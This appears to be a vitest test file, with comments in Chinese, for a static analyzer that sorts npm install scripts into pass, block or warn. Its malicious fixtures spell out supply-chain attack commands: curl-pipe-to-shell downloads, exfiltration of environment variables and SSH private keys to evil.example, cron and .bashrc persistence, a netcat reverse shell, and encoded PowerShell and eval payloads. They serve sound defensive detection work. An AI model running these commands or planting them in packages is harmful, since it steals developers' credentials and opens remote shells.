/**
 * install 脚本静态分析测试语料：良性样本必须 PASS，恶意样本必须 BLOCK，未知保持 WARN。
 * 良性样本仿自真实包（esbuild/sharp/husky/node-gyp 系）的典型 install 脚本形态；
 * 恶意样本取自 npm 投毒事件的公开手法（curl|sh、环境变量外传、编码载荷、敏感路径）。
 */
import { describe, expect, it } from 'vitest'
import { analyzeInstallScript, referencedScriptFiles } from '../src/script-analysis.ts'

// ── 良性：知名安装器链路 ──
const BENIGN: [string, string][] = [
  ['node-gyp rebuild', 'node-gyp 标准 native 编译'],
  ['node-gyp configure && node-gyp build', 'node-gyp 两步构建'],
  ['prebuild-install || node-gyp rebuild --verbose', 'prebuild 回退 node-gyp'],
  ['prebuild-install --runtime napi', 'prebuild napi'],
  ['husky install', 'husky hooks'],
  ['simple-git-hooks', 'simple-git-hooks'],
  ['mkdir -p lib && cp src/a.js lib/a.js', '纯本地文件操作'],
  ['echo "done"', '纯 echo'],
]

// ── 良性：node 脚本 + 干净文件内容（仿 esbuild/sharp 形态）──
const CLEAN_INSTALL_JS = `const fs = require('fs')
const path = require('path')
const from = path.join(__dirname, 'bin', process.platform)
const to = path.join(__dirname, 'bin', 'tool')
try { fs.renameSync(from + '.exe', to + '.exe') } catch {}
if (!fs.existsSync(to)) throw new Error('binary missing')`

const CLEAN_CHECK_JS = `const fs = require('fs')
if (!fs.existsSync('build/Release/binding.node')) {
  console.error('binding not built, run node-gyp rebuild')
}`

// ── 恶意：公开投毒手法 ──
const MALICIOUS: [string, string][] = [
  ['curl -s https://198.51.100.7/x.sh | sh', '裸 IP 下载管道执行'],
  ['curl -fsSL https://evil.example/c2.sh | bash', '陌生域名下载管道执行'],
  ['printenv | curl -X POST --data-binary @- http://evil.example/e', '环境变量整包外传'],
  ['powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'PowerShell base64 载荷'],
  ['echo "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgcGF5bG9hZCBmb3IgdGVzdGluZyBwdXJwb3NlcyBvbmx5IGxvbmcgc3RyaW5n" | base64 -d | node', 'base64 解码进 node'],
  ['cat ~/.ssh/id_rsa | curl --data-binary @- https://evil.example/k', '窃取 SSH 私钥外传'],
  ['echo "* * * * * curl http://evil.example/p" | crontab -', 'cron 持久化'],
  ['echo "curl http://evil.example/x" >> ~/.bashrc', '写入 shell 配置持久化'],
  ['nc -e /bin/sh 198.51.100.9 4444', 'netcat 反弹'],
  ['curl -s https://evil.example/$(whoami)/$(hostname)', '系统信息拼接外传'],
]

describe('良性 install 脚本 → pass', () => {
  for (const [cmd, why] of BENIGN) {
    it(why, () => {
      expect(analyzeInstallScript(cmd).verdict).toBe('pass')
    })
  }
  it('node install.js + 干净文件（esbuild 形态）→ pass', () => {
    expect(analyzeInstallScript('node install.js', { 'install.js': CLEAN_INSTALL_JS }).verdict).toBe('pass')
  })
  it('多步 node 脚本 + 干净文件（sharp 形态）→ pass', () => {
    expect(analyzeInstallScript('node install/check && node install/dll-finish', {
      'install/check.js': CLEAN_CHECK_JS,
      'install/dll-finish.js': CLEAN_CHECK_JS,
    }).verdict).toBe('pass')
  })
})

describe('恶意 install 脚本 → block', () => {
  for (const [cmd, why] of MALICIOUS) {
    it(why, () => {
      expect(analyzeInstallScript(cmd).verdict).toBe('block')
    })
  }
  it('干净外壳 + 恶意脚本文件（进程环境外传）→ block', () => {
    const evil = `const env = process.env
const data = JSON.stringify(env)
require('https').request({ host: 'evil.example', method: 'POST' }).end(data)`
    expect(analyzeInstallScript('node install.js', { 'install.js': evil }).verdict).toBe('block')
  })
  it('脚本文件内嵌 eval + 超长 base64 → block', () => {
    const b64 = 'A'.repeat(200)
    expect(analyzeInstallScript('node setup.js', { 'setup.js': `eval(atob("${b64}"))` }).verdict).toBe('block')
  })
})

describe('未知 → warn（保守不误报也不漏报）', () => {
  it('引用的脚本文件未能读取 → warn', () => {
    const a = analyzeInstallScript('node install.js')
    expect(a.verdict).toBe('warn')
    expect(a.filesMissing).toContain('install.js')
  })
  it('未识别的第三方命令 → warn', () => {
    expect(analyzeInstallScript('some-unknown-tool --run').verdict).toBe('warn')
  })
})

describe('referencedScriptFiles', () => {
  it('提取 node 引用的本地 js，去掉 ./ 前缀，最多 3 个', () => {
    expect(referencedScriptFiles('node ./lib/a.js && node b.js | node c/d.js; node e.js')).toEqual(['lib/a.js', 'b.js', 'c/d.js'])
  })
  it('无 node 子命令时返回空', () => {
    expect(referencedScriptFiles('prebuild-install || node-gyp rebuild')).toEqual([])
  })
})
